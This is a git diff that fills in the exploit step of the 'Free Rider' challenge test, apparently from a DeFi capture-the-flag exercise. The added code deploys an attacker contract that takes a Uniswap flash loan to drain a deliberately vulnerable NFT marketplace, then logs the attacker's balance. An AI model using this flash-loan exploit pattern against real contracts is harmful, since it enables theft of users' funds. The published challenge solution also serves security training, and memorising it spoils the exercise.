@@ -105,6 +105,40 @@ describe('[Challenge] Free Rider', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const AttackerContractFactory = await ethers.getContractFactory("FreeRiderNFTMarketplaceAttacker");
+
+        //fee of 0.3% of the loan
+        const uniswapFee = ethers.utils.parseEther("0.045");
+
+        const ABI = ["function withdraw(uint wad) external"];
+
+        const iface = new ethers.utils.Interface(ABI);
+
+        const data = iface.encodeFunctionData("withdraw", [NFT_PRICE]);
+
+        console.log("function signature: ", ethers.utils.keccak256(ethers.utils.toUtf8Bytes("withdraw(uint)")).substr(0, 10))
+
+        const attackerContract = await AttackerContractFactory.deploy(
+            this.nft.address,//address _nft,
+            this.marketplace.address,//address _marketplace, 
+            this.uniswapPair.address,//address _pair,
+            NFT_PRICE,//uint256 _loanAmount,
+            uniswapFee,//uint256 uniswapFee,
+            this.weth.address, //address wethAddress,
+            this.buyerContract.address,//address _to
+            {value: uniswapFee}
+        );
+
+        await attackerContract.deployed();
+
+        let tx = await attackerContract.attack();
+
+        await tx.wait();
+
+        console.log(
+            "attacker ether",
+            (await provider.getBalance(attacker.address)).div(ethers.utils.parseEther("1")).toString()
+        )
     });
 
     after(async function () {
